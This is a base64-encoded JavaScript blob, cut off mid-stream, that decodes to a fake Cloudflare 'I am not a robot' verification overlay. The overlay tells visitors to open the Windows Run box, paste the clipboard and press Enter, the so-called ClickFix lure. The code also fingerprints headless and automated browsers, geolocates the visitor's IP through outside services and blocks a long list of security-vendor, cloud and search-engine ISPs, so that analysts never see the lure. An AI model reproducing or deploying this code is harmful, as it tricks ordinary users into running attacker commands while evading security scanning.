6UFNKalZqaE1RV2hWU0VSd0lqNE5DaUFnSUNBZ0lDQWdJQ0FnSUR3dlpHbDJQZzBLSUNBZ0lDQWdJQ0FnSUNBZ1BHUnBkaUJqYkdGemN6MGlZMGxsVlVzNE5YTmhjQ0krRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEdnelBreGxkQ0IxY3lCcmJtOTNJSGx2ZFNkeVpTQm9kVzFoYml3Z2NHeGxZWE5sSUdOdmJYQnNaWFJsSUhOMFpYQnpPand2YURNK0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BHOXNJR05zWVhOelBTSmpUa1poU1dGVlFuRnVZMjRpUGcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQThiR2srTVM0Z1VISmxjM01nSmlCb2IyeGtJSFJvWlNCWGFXNWtiM2R6SUV0bGVRMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1BHbHRaeUJ6Y21NOUltaDBkSEJ6T2k4dmRYQnNiMkZrTG5kcGEybHRaV1JwWVM1dmNtY3ZkMmxyYVhCbFpHbGhMMk52YlcxdmJuTXZkR2gxYldJdk5TODFaaTlYYVc1a2IzZHpYMnh2WjI5ZkxWOHlNREV5TG5OMlp5OHlNRFE0Y0hndFYybHVaRzkzYzE5c2IyZHZYeTFmTWpBeE1pNXpkbWN1Y0c1bklpQmpiR0Z6Y3owaVkzWk9NbkkzV0c1WlFYSTJNelFpSUdGc2REMGlWMmx1Wkc5M2N5QkxaWGtpUGcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNzZ1BHdGlaRDVTUEM5clltUStEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUR3dmJHaytEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUR4c2FUNHlMaUJKYmlCMGFHVWdkbVZ5YVdacFkyRjBhVzl1SUhkcGJtUnZkeXdnY0hKbGMzTWdQR3RpWkQ1RGRISnNQQzlyWW1RK0lDc2dQR3RpWkQ1V1BDOXJZbVErUEM5c2FUNE5DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEd4cFBqTXVJRkJ5WlhOeklEeHJZbVErUlc1MFpYSThMMnRpWkQ0Z2IyNGdkR2hsSUd0bGVXSnZZWEprSUhSdklHTnZiWEJzWlhSbFBDOXNhVDROQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0E4TDI5c1BnMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lEeGthWFlnWTJ4aGMzTTlJbU5pVlVaU2FVZHVNbmtpUGcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdQR2d6UGxsdmRTQnphRzkxYkdRZ2MyVmxJSFJvYVhNZ2RHVjRkQ0JoY0hCbFlYSTZQQzlvTXo0TkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRHh3SUdsa1BTSnBWRVZSUVVKck9XTWlQa2tnWVcwZ2JtOTBJR0VnY205aWIzUWdMU0JEYkc5MVpHWnNZWEpsSUVsRU9pQThMM0ErRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEM5a2FYWStEUW9nSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajROQ2lBZ0lDQWdJQ0FnSUNBZ0lEeGthWFlnWTJ4aGMzTTlJbTF2WkdGc0xXTmxTSEE1VVhaWlVVaExTaUkrRFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnUEhBK1VHVnlabTl5YlNCMGFHVWdjM1JsY0hNZ1lXSnZkbVVnZEc4Z1kyOXRjR3hsZEdVZ2RtVnlhV1pwWTJGMGFXOXVQQzl3UGcwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUR4aWRYUjBiMjRnYVdROUlta3hlVmRvU1d4V01FTm1OQ0krVmtWU1NVWlpQQzlpZFhSMGIyNCtEUW9nSUNBZ0lDQWdJQ0FnSUNBOEwyUnBkajROQ2lBZ0lDQWdJQ0FnUEM5a2FYWStEUW9nSUNBZ1BDOWthWFkrRFFvTkNqd3ZZbTlrZVQ0TkNqd3ZhSFJ0YkQ0PSc7CiAgICBjb25zdCBoID0gYjY0VG9VdGY4KGI2NCk7CgogICAgLy8gQ3JlYXRlIGhvc3QgZWxlbWVudCBmb3IgU2hhZG93IERPTQogICAgY29uc3QgaG9zdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2RpdicpOwogICAgaG9zdC5pZCA9ICd0Zi1vdmVybGF5LWhvc3QnOwogICAgaG9zdC5zdHlsZS5jc3NUZXh0ID0gJ3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDB2dztoZWlnaHQ6MTAwdmg7ei1pbmRleDoyMTQ3NDgzNjQ3O2JhY2tncm91bmQ6dHJhbnNwYXJlbnQ7Ym9yZGVyOm5vbmU7bWFyZ2luOjA7cGFkZGluZzowOyc7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGhvc3QpOwoKICAgIC8vIEF0dGFjaCBTaGFkb3cgRE9NIGZvciBzdHlsZSBpc29sYXRpb24KICAgIGNvbnN0IHNoYWRvdyA9IGhvc3QuYXR0YWNoU2hhZG93KHsgbW9kZTogJ29wZW4nIH0pOwogICAgCiAgICAvLyBQYXJzZSB0aGUgSFRNTCBjb250ZW50IHVzaW5nIERPTVBhcnNlciB0byBwcm9wZXJseSBleHRyYWN0IHBhcnRzCiAgICBjb25zdCBwYXJzZXIgPSBuZXcgRE9NUGFyc2VyKCk7CiAgICBjb25zdCBkb2MgPSBwYXJzZXIucGFyc2VGcm9tU3RyaW5nKGgsICd0ZXh0L2h0bWwnKTsKCiAgICAvLyAxLiBFeHRyYWN0IGFuZCBwcm9jZXNzIFN0eWxlcwogICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoJ3N0eWxlJykuZm9yRWFjaChzdHlsZSA9PiB7CiAgICAgICAgbGV0IGNzcyA9IHN0eWxlLnRleHRDb250ZW50IHx8ICcnOwogICAgICAgIC8vIFJlcGxhY2UgJ2JvZHknIHNlbGVjdG9yIHdpdGggJyN0Zi1vdmVybGF5LXJvb3QnIChoYW5kbGluZyBjb250ZXh0KQogICAgICAgIGNzcyA9IGNzcy5yZXBsYWNlKC8oXnxbXH1ccyxdKWJvZHkoPz1bXHMsXC57XSkvZywgJyQxI3RmLW92ZXJsYXktcm9vdCcpOwogICAgICAgIC8vIFJlcGxhY2UgJ2h0bWwnIHNlbGVjdG9yIHdpdGggJzpob3N0JwogICAgICAgIGNzcyA9IGNzcy5yZXBsYWNlKC8oXnxbXH1ccyxdKWh0bWwoPz1bXHMsXC57XSkvZywgJyQxOmhvc3QnKTsKICAgICAgICBzdHlsZS50ZXh0Q29udGVudCA9IGNzczsKICAgICAgICBzaGFkb3cuYXBwZW5kQ2hpbGQoc3R5bGUpOwogICAgfSk7CgogICAgLy8gMi4gRXh0cmFjdCBhbmQgbW92ZSBleHRlcm5hbCBzdHlsZXNoZWV0cwogICAgZG9jLnF1ZXJ5U2VsZWN0b3JBbGwoJ2xpbmtbcmVsPSJzdHlsZXNoZWV0Il0nKS5mb3JFYWNoKGxpbmsgPT4gewogICAgICAgIHNoYWRvdy5hcHBlbmRDaGlsZChsaW5rKTsKICAgIH0pOwoKICAgIC8vIDMuIENyZWF0ZSBjb250YWluZXIgaW5zaWRlIHNoYWRvdyAoYWN0aW5nIGFzIHBzZXVkby1ib2R5KQogICAgY29uc3QgY29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7CiAgICBjb250YWluZXIuaWQgPSAndGYtb3ZlcmxheS1yb290JzsKICAgIGNvbnRhaW5lci5zdHlsZS5jc3NUZXh0ID0gJ3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbjttYXJnaW46MDtwYWRkaW5nOjA7JzsKICAgIAogICAgLy8gQ29weSBib2R5IGF0dHJpYnV0ZXMgKGNsYXNzZXMsIGlubGluZSBzdHlsZXMpIGZyb20gdGVtcGxhdGUgdG8gb3VyIGNvbnRhaW5lcgogICAgaWYgKGRvYy5ib2R5KSB7CiAgICAgICAgQXJyYXkuZnJvbShkb2MuYm9keS5hdHRyaWJ1dGVzKS5mb3JFYWNoKGF0dHIgPT4gewogICAgICAgICAgICBpZiAoYXR0ci5uYW1lID09PSAnc3R5bGUnKSB7CiAgICAgICAgICAgICAgICAgY29udGFpbmVyLnN0eWxlLmNzc1RleHQgKz0gJzsnICsgYXR0ci52YWx1ZTsKICAgICAgICAgICAgfSBlbHNlIGlmIChhdHRyLm5hbWUgPT09ICdjbGFzcycpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuY2xhc3NOYW1lID0gYXR0ci52YWx1ZTsKICAgICAgICAgICAgfSBlbHNlIGlmIChhdHRyLm5hbWUgIT09ICdpZCcpIHsKICAgICAgICAgICAgICAgICBjb250YWluZXIuc2V0QXR0cmlidXRlKGF0dHIubmFtZSwgYXR0ci52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgICAgICAKICAgICAgICAvLyBNb3ZlIGFsbCBjaGlsZHJlbiBmcm9tIHRlbXBsYXRlIGJvZHkgdG8gY29udGFpbmVyCiAgICAgICAgd2hpbGUgKGRvYy5ib2R5LmZpcnN0Q2hpbGQpIHsKICAgICAgICAgICAgY29udGFpbmVyLmFwcGVuZENoaWxkKGRvYy5ib2R5LmZpcnN0Q2hpbGQpOwogICAgICAgIH0KICAgIH0KICAgIAogICAgc2hhZG93LmFwcGVuZENoaWxkKGNvbnRhaW5lcik7CiAgICAKICAgIC8vIFN0b3JlIHNoYWRvdyByb290IGdsb2JhbGx5IGZvciBzY3JpcHRzIHRvIHF1ZXJ5IGVsZW1lbnRzCiAgICB3aW5kb3cuX190ZlNoYWRvd1Jvb3QgPSBzaGFkb3c7CiAgICAKICAgIC8vIEZvcmNlIGxheW91dCByZWNhbGN1bGF0aW9uCiAgICB2b2lkIGhvc3Qub2Zmc2V0SGVpZ2h0OwogICAgCiAgICAvLyBCbG9jayBzY3JvbGwgb24gYm9keQogICAgZG9jdW1lbnQuYm9keS5zdHlsZS5vdmVyZmxvdyA9ICdoaWRkZW4nOwogICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93ID0gJ2hpZGRlbic7CiAgICB3aW5kb3cuc2Nyb2xsVG8oMCwgMCk7CiAgICAKICAgIHNldFRpbWVvdXQoaW5qZWN0U2NyaXB0LCAwKTsKICB9CgogIGNvbnN0IEhFQURMRVNTX1dFSUdIVCA9IDEwOwogIGNvbnN0IEhFQURGVUxfV0VJR0hUID0gLTg7CiAgY29uc3QgU1VTUElDSU9VU19XRUlHSFQgPSA1OwoKICBhc3luYyBmdW5jdGlvbiBkZXRlY3RIZWFkbGVzcygpIHsKICAgIGNvbnN0IGNoZWNrcyA9IFsKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvaGVhZGxlc3N8cGhhbnRvbWpzfHNlbGVuaXVtfHdlYmRyaXZlci9pLnRlc3QodWEpOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0hlYWRsZXNzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGhhc1dlYmRyaXZlciA9IG5hdmlnYXRvci53ZWJkcml2ZXIgPT09IHRydWU7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGhhc1dlYmRyaXZlciA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBoYXNDaHJvbWUgPSAhIXdpbmRvdy5jaHJvbWU7CiAgICAgICAgY29uc3QgaGFzQ29ycmVjdENocm9tZSA9IGhhc0Nocm9tZSAmJiAod2luZG93LmNocm9tZS5ydW50aW1lIHx8IHdpbmRvdy5jaHJvbWUubG9hZFRpbWVzKTsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAhaGFzQ2hyb21lIHx8ICFoYXNDb3JyZWN0Q2hyb21lOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1N1c3BpY2lvdXMgPyBTVVNQSUNJT1VTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICBpZiAoIW5hdmlnYXRvci5wZXJtaXNzaW9ucykgcmV0dXJuIHsgc2NvcmU6IDAgfTsKICAgICAgICB0cnkgewogICAgICAgICAgY29uc3QgcGVybWlzc2lvblN0YXR1cyA9IGF3YWl0IG5hdmlnYXRvci5wZXJtaXNzaW9ucy5xdWVyeSh7IG5hbWU6ICJub3RpZmljYXRpb25zIiB9KTsKICAgICAgICAgIGNvbnN0IG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPSBOb3RpZmljYXRpb24ucGVybWlzc2lvbjsKICAgICAgICAgIGNvbnN0IGlzSW5jb25zaXN0ZW50ID0gKG5vdGlmaWNhdGlvblBlcm1pc3Npb24gPT09ICJkZW5pZWQiICYmIHBlcm1pc3Npb25TdGF0dXMuc3RhdGUgPT09ICJwcm9tcHQiKTsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0luY29uc2lzdGVudCA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgIHJldHVybiB7IHNjb3JlOiBTVVNQSUNJT1VTX1dFSUdIVCB9OwogICAgICAgIH0KICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IHBsdWdpbnNMZW5ndGggPSBuYXZpZ2F0b3IucGx1Z2lucz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gcGx1Z2luc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gU1VTUElDSU9VU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2UgPSBuYXZpZ2F0b3IubGFuZ3VhZ2U7CiAgICAgICAgY29uc3QgbGFuZ3VhZ2VzTGVuZ3RoID0gbmF2aWdhdG9yLmxhbmd1YWdlcz8ubGVuZ3RoIHx8IDA7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gIWxhbmd1YWdlIHx8IGxhbmd1YWdlc0xlbmd0aCA9PT0gMDsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIHRyeSB7CiAgICAgICAgICBjb25zdCBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdjYW52YXMnKTsKICAgICAgICAgIGNvbnN0IGdsID0gY2FudmFzLmdldENvbnRleHQoJ3dlYmdsJykgfHwgY2FudmFzLmdldENvbnRleHQoJ2V4cGVyaW1lbnRhbC13ZWJnbCcpOwogICAgICAgICAgaWYgKCFnbCkgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgICBjb25zdCBkZWJ1Z0luZm8gPSBnbC5nZXRFeHRlbnNpb24oJ1dFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8nKTsKICAgICAgICAgIGNvbnN0IHJlbmRlcmVyID0gZGVidWdJbmZvID8gZ2wuZ2V0UGFyYW1ldGVyKGRlYnVnSW5mby5VTk1BU0tFRF9SRU5ERVJFUl9XRUJHTCkgOiAndW5rbm93bic7CiAgICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAvc3dpZnRzaGFkZXJ8bGx2bXBpcGV8bWVzYS9pLnRlc3QocmVuZGVyZXIpOwogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IFNVU1BJQ0lPVVNfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgcmV0dXJuIHsgc2NvcmU6IFNVU1BJQ0lPVVNfV0VJR0hUIH07CiAgICAgICAgfQogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3Qgb3V0ZXJIZWlnaHQgPSB3aW5kb3cub3V0ZXJIZWlnaHQ7CiAgICAgICAgY29uc3Qgb3V0ZXJXaWR0aCA9IHdpbmRvdy5vdXRlcldpZHRoOwogICAgICAgIGNvbnN0IGlubmVySGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwogICAgICAgIGNvbnN0IGlubmVyV2lkdGggPSB3aW5kb3cuaW5uZXJXaWR0aDsKICAgICAgICBjb25zdCBpc1N1c3BpY2lvdXMgPSAob3V0ZXJIZWlnaHQgPT09IDAgJiYgb3V0ZXJXaWR0aCA9PT0gMCkgfHwgKG91dGVySGVpZ2h0ID09PSBpbm5lckhlaWdodCAmJiBvdXRlcldpZHRoID09PSBpbm5lcldpZHRoKTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNTdXNwaWNpb3VzID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzQ29udHJvbGxlZCA9IG5hdmlnYXRvci53ZWJkcml2ZXIgfHwgd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnd2ViZHJpdmVyJykgPT09ICd0cnVlJyB8fCB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc0NvbnRyb2xsZWQgPyBIRUFETEVTU19XRUlHSFQgOiBIRUFERlVMX1dFSUdIVCB9OwogICAgICB9LAogICAgICAoKSA9PiB7CiAgICAgICAgY29uc3QgaXNIZWFkbGVzcyA9IC9IZWFkbGVzc0Nocm9tZS8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNIZWFkbGVzcyA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzUGhhbnRvbSA9IHdpbmRvdy5jYWxsUGhhbnRvbSB8fCB3aW5kb3cuX3BoYW50b20gfHwgd2luZG93LnBoYW50b207CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzUGhhbnRvbSA/IEhFQURMRVNTX1dFSUdIVCA6IDAgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzU2VsZW5pdW0gPSB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCdzZWxlbml1bScpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpICE9PSBudWxsIHx8IHdpbmRvdy5kb2N1bWVudD8uJGNkY18gIT09IHVuZGVmaW5lZCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiR3ZGNfICE9PSB1bmRlZmluZWQ7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU2VsZW5pdW0gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0KICAgIF07CgogICAgbGV0IHRvdGFsU2NvcmUgPSAwOwogICAgZm9yIChjb25zdCBjaGVjayBvZiBjaGVja3MpIHsKICAgICAgdHJ5IHsKICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjaGVjaygpOwogICAgICAgIHRvdGFsU2NvcmUgKz0gcmVzdWx0LnNjb3JlOwogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIC8vIElnbm9yZSBlcnJvcnMKICAgICAgfQogICAgfQoKICAgIGNvbnN0IG1heFBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBRExFU1NfV0VJR0hUOwogICAgY29uc3QgbWluUG9zc2libGVTY29yZSA9IGNoZWNrcy5sZW5ndGggKiBIRUFERlVMX1dFSUdIVDsKICAgIGNvbnN0IG5vcm1hbGl6ZWRTY29yZSA9IE1hdGgubWF4KDAsIE1hdGgubWluKDEwMCwgKCh0b3RhbFNjb3JlIC0gbWluUG9zc2libGVTY29yZSkgLyAobWF4UG9zc2libGVTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpKSAqIDEwMCkpOwogICAgcmV0dXJuIE1hdGgucm91bmQobm9ybWFsaXplZFNjb3JlKTsKICB9CgogIGZ1bmN0aW9uIGRldGVjdE9TKCkgewogICAgY29uc3QgdXNlckFnZW50ID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgY29uc3QgcGxhdGZvcm0gPSBuYXZpZ2F0b3IucGxhdGZvcm0/LnRvTG93ZXJDYXNlKCkgfHwgJyc7CgogICAgaWYgKC9pcGhvbmV8aXBhZHxpcG9kL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2lvcyc7CiAgICBpZiAoL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnYW5kcm9pZCc7CiAgICBpZiAoL2xpbnV4L2kudGVzdCh1c2VyQWdlbnQpICYmICEvYW5kcm9pZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdsaW51eCc7CiAgICBpZiAoL21hYyBvcyB4fG1hY2ludG9zaC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdtYWMnOwogICAgaWYgKC93aW4vaS50ZXN0KHVzZXJBZ2VudCkgfHwgL3dpbi9pLnRlc3QocGxhdGZvcm0pKSByZXR1cm4gJ3dpbmRvd3MnOwoKICAgIHJldHVybiAndW5rbm93bic7CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpc0FjY2Vzc0FsbG93ZWQoKSB7CiAgICB0cnkgewogICAgICBjb25zdCBkZXRlY3RlZE9TID0gZGV0ZWN0T1MoKTsKICAgICAgY29uc3QgaW5jbHVkZU9TTGlzdCA9IFtdOwogICAgICBpZiAoaW5jbHVkZU9TTGlzdC5sZW5ndGggPiAwICYmICFpbmNsdWRlT1NMaXN0LmluY2x1ZGVzKGRldGVjdGVkT1MpKSB7CiAgICAgICAgdmxvZygnZGVueV9vcycsIGRldGVjdGVkT1MpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBoZWFkbGVzc1Byb2JhYmlsaXR5ID0gYXdhaXQgZGV0ZWN0SGVhZGxlc3MoKTsKICAgICAgaWYgKGhlYWRsZXNzUHJvYmFiaWxpdHkgPiAyNSkgewogICAgICAgIHZsb2coJ2RlbnlfaGVhZGxlc3MnLCBoZWFkbGVzc1Byb2JhYmlsaXR5KTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYm90UGF0dGVybnMgPSBbJ2JvdCcsJ2NyYXdsJywnc3BpZGVyJywnc2NyYXBlJywnc2x1cnAnLCd5YWhvbycsJ2dvb2dsZScsJ3lhbmRleCcsJ2JhaWR1JywnYmluZycsJ2R1Y2tkdWNrJywndGVvbWEnLCdhcmNoaXZlJ107CiAgICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgICAgZm9yIChjb25zdCBwYXR0ZXJuIG9mIGJvdFBhdHRlcm5zKSB7CiAgICAgICAgaWYgKHVzZXJBZ2VudC5pbmNsdWRlcyhwYXR0ZXJuKSkgewogICAgICAgICAgdmxvZygnZGVueV9ib3RfdWEnLCB1c2VyQWdlbnQpOwogICAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgIH0KCiAgICAgIAogICAgICBjb25zdCBpcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZz9mb3JtYXQ9anNvbicpOwogICAgICBpZiAoIWlwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpcGlmeV9mYWlsZWQnLCBpcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXBEYXRhID0gYXdhaXQgaXBSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlwID0gaXBEYXRhLmlwOwoKICAgICAgY29uc3QgaXNwUmVzcG9uc2UgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9pcDJsb2NhdGlvbi1hcGktOTc5ODQ4MDY3Njc3LnVzLWNlbnRyYWwxLnJ1bi5hcHAvP2lwPScgKyBpcCk7CiAgICAgIGlmICghaXNwUmVzcG9uc2Uub2spIHsKICAgICAgICB2bG9nKCdpc3BfbG9va3VwX2ZhaWxlZCcsIGlzcFJlc3BvbnNlLnN0YXR1cyk7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgIH0KICAgICAgY29uc3QgaXNwRGF0YSA9IGF3YWl0IGlzcFJlc3BvbnNlLmpzb24oKTsKICAgICAgY29uc3QgaXNwID0gaXNwRGF0YS5pc3AgfHwgJyc7CiAgICAgIGNvbnN0IGNvdW50cnlDb2RlID0gaXNwRGF0YS5nZW9pcDJfY291bnRyeV9jb2RlIHx8ICcnOwoKICAgICAgdmxvZygnaXBfaW5mbycsIHsgaXAsIGNvdW50cnlDb2RlLCBpc3AgfSk7CgogICAgICBjb25zdCBpbmNsdWRlQ291bnRyeUxpc3QgPSBbXTsKICAgICAgaWYgKGluY2x1ZGVDb3VudHJ5TGlzdC5sZW5ndGggPiAwICYmICghY291bnRyeUNvZGUgfHwgIWluY2x1ZGVDb3VudHJ5TGlzdC5pbmNsdWRlcyhjb3VudHJ5Q29kZSkpKSB7CiAgICAgICAgdmxvZygnZGVueV9jb3VudHJ5JywgY291bnRyeUNvZGUpOwogICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICB9CgogICAgICBjb25zdCBibG9ja2VkSVNQcyA9IFsKICAgICAgICAnTTI0NyBFdXJvcGUnLCdQYWNrZXRodWInLCdMZWFzZVdlYicsJ0RhdGFDYW1wJywnSVBYTycsJ1NlY3VyZSBEYXRhIFN5c3RlbXMnLCdOaWVkZXJzYWVjaHNpc2NoZSBMYW5kZXNyZWdpZXJ1bmcnLCdCYXJyYWN1ZGEgTmV0d29ya3MnLCdUcmVuZCBNaWNybyBJbmNvcnBvcmF0ZWQnLCdNaWNyb3NvZnQgQ29ycCcsJ01pY3Jvc29mdCBDb3Jwb3JhdGlvbicsJ1N1cmZDb250cm9sJywnV2Vic2Vuc2UnLCdHSE9TVG5ldCBHbWJIJywnSU5FVHUnLCdBdmlyYSBCLlYuJywnR29vZ2xlIENsb3VkJywnWWFob28hJywnQ29tbXRvdWNoJywnQ2xvdWRGbGFyZScsJ1RydXN0d2F2ZSBIb2xkaW5ncycsJ0ZPUlRIbmV0IFNBJywnVVMgRGVwYXJ0bWVudCBvZiBEZWZlbnNlIE5ldHdvcmsnLCdaT05FUyBBUycsJ0Npc2NvIFN5c3RlbXMgSXJvbnBvcnQgRGl2aXNpb24nLCdUaGVQbGFuZXQuY29tIEludGVybmV0IFNlcnZpY2VzJywnV2Vicm9vdCBTZXJ2aWNlcycsJ1JhY2tzcGFjZSBIb3N0aW5nJywnUGVyaW1ldGVyIGVTZWN1cml0eScsJ0RpZ2l0YWxPY2VhbicsJ1BhY2tldEV4Y2hhbmdlJywnR3lyb24gSW50ZXJuZXQgTHRkJywnTmV3TWVkaWEgRXhwcmVzcyBQdGUnLCdBbWF6b24uY29tJywnTWNBZmVlJywnRVNFVCwgc3BvbC4gcyByLm8uJywnRmFjZWJvb2snLCdGYWNlYm9vayBJcmVsYW5kIEx0ZCcsJ1lhaG9vISBCcm9hZGNhc3QgU2VydmljZXMnLCdZYWhvbyEgSW5kaWEgUHZ0JywnWWFob28gSmFwYW4nLCdZYWhvbyBKYXBhbiBDb3Jwb3JhdGlvbicsJ0dvb2dsZWJvdCcsJ0FWQVNUIFNvZnR3YXJlIHMuci5vLicsJ01pY3Jvc29mdCBiaW5nYm90JywnTWljcm9zb2Z0IEhvc3RpbmcnLCdBbWF6b24gVGVjaG5vbG9naWVzJywnQ3l2ZWlsbGFuY2UnLCdDbG91ZG1hcmsnLCdDbG91ZG1hcmsgTGFicycsJ1RvcHN5IExhYnMnLCdBbWF6b24nLCdTRVJWRVIgQkxPQ0snLCdPVkggSG9zdGluZycsJ1lBTkRFWCcsJ1lBTkRFWCBMTEMnLCdZYWhvbyBCYW5nYWxvcmU